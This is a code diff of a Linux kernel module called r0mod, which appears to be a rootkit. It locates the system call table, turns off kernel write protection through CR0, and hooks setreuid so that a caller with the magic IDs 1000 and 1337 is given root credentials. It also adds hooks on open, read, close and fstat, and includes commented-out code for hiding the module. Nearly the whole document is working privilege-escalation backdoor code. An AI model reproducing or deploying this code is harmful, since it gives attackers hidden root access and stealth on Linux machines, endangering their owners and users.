@@ -1,21 +1,27 @@
+#include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-#include <linux/unistd.h>
-#include <linux/syscalls.h>
+#include <linux/unistd.h>   // syscalls
+#include <linux/syscalls.h> // syscalls
+
+#include <asm/paravirt.h>   // write_cr0
 
 #include <r0mod/global.h>
 
-unsigned long *sct;
+#define SEARCH_START    PAGE_OFFSET
+#define SEARCH_END      ULLONG_MAX //PAGE_OFFSET + 0xffffffff
+
+unsigned long *syscall_table;
 
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
 {
-    fm_alert("[trying]: ruid == %d && euid == %d\n", ruid, euid);
+    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);
 
     if((ruid == 1000) && (euid == 1337))
     {
-        fm_alert("[Correct]: You got the correct ids.\n");
+        printk("[Correct]: You got the correct ids.\n");
         commit_creds(prepare_kernel_cred(0));
 
         return new_setreuid(0, 0);
@@ -24,82 +30,109 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-unsigned long *locate_sct(void)
+asmlinkage int (*orig_open)(const char *pathname, int flags);
+asmlinkage int new_open(const char *pathname, int flags)
 {
-    unsigned long offset;
+    return orig_open(pathname, flags);
+}
 
-    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
+asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t new_read(int fd, void *buf, size_t count)
+{
+    return orig_read(fd, buf, count);
+}
+
+asmlinkage int (*orig_close)(int fd);
+asmlinkage int new_close(int fd)
+{
+    return orig_close(fd);
+}
+
+asmlinkage int (*orig_fstat)(int fd, struct stat *buf);
+asmlinkage int new_fstat(int fd, struct stat *buf)
+{
+    return orig_fstat(fd, buf);
+}
+
+unsigned long *find_sys_call_table(void)
+{
+    unsigned long i;
+
+    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
     {
-        unsigned long *sct = (unsigned long *)offset;
-        if(sct[__NR_close] == (unsigned long)sys_close)
+        unsigned long *sys_call_table = (unsigned long *)i;
+
+        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
         {
-            fm_alert("Succeeded to get sys_call_table!\n");
-            return sct;
+            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
+            return sys_call_table;
         }
     }
-
-    fm_alert("Failed to get sys_call_table!\n");
 
     return NULL;
 }
 
-void disable_page_protection(void)
-{
-    unsigned long value;
-    asm volatile("mov %%cr0, %0" : "=r" (value));
-
-    if(!(value & 0x00010000))
-        return;
-
-    asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
-}
-
-void enable_page_protection(void)
-{
-    unsigned long value;
-    asm volatile("mov %%cr0, %0" : "=r" (value));
-
-    if((value & 0x00010000))
-        return;
-
-    asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
-}
-
 static int __init r0mod_init(void)
 {
-    fm_alert("Module starting...\n");
+    printk("Module starting...\n");
 
-    if(!(sct = locate_sct()))
-        return -1;
+    //printk("Hiding module object.\n");
+    //list_del_init(&__this_module.list);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    fm_alert("sys_call_table: %lx\n", (unsigned long)sct);
+    printk("Search Start: %lx\n", SEARCH_START);
+    printk("Search End:   %lx\n", SEARCH_END);
 
-    disable_page_protection();
+    //syscall_table = (void *)find_sys_call_table();
+    if((syscall_table = (void *)find_sys_call_table()) == NULL)
     {
-        fm_alert("sys_call_table: Hooking setreuid!\n");
-        orig_setreuid = (void *)sct[__NR_setreuid];
-        sct[__NR_setreuid] = (unsigned long)new_setreuid;
+        printk("syscall_table == NULL\n");
+        return -1;
     }
-    enable_page_protection();
+
+    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
+
+    write_cr0(read_cr0() & (~0x10000));
+
+    orig_setreuid = (void *)syscall_table[__NR_setreuid];
+    syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;
+
+    orig_open  = (void *)syscall_table[__NR_open];
+    syscall_table[__NR_open] = (unsigned long)new_open;
+
+    orig_close = (void *)syscall_table[__NR_close];
+    syscall_table[__NR_close] = (unsigned long)new_close;
+
+    orig_read  = (void *)syscall_table[__NR_read];
+    syscall_table[__NR_read] = (unsigned long)new_read;
+
+    orig_fstat = (void *)syscall_table[__NR_fstat];
+    syscall_table[__NR_fstat] = (unsigned long)new_fstat;
+
+    write_cr0(read_cr0() | 0x10000);
 
     return 0;
 }
 
+
 static void __exit r0mod_exit(void)
 {
-    fm_alert("Module ending...\n");
+    printk("Module ending...\n");
 
-    if(!sct)
+    if(syscall_table != NULL)
     {
-        disable_page_protection();
-        {
-            fm_alert("sys_call_table: Restoring setreuid!\n");
-            sct[__NR_setreuid] = (unsigned long)orig_setreuid;
-        }
-        enable_page_protection();
+        write_cr0(read_cr0() & (~0x10000));
+
+        syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
+        syscall_table[__NR_open] = (unsigned long)orig_open;
+        syscall_table[__NR_close] = (unsigned long)orig_close;
+        syscall_table[__NR_read] = (unsigned long)orig_read;
+        syscall_table[__NR_fstat] = (unsigned long)orig_fstat;
+
+        write_cr0(read_cr0() | 0x10000);
     }
 }
 
+MODULE_LICENSE("GPL");
 module_init(r0mod_init);
 module_exit(r0mod_exit);
-MODULE_LICENSE("GPL");
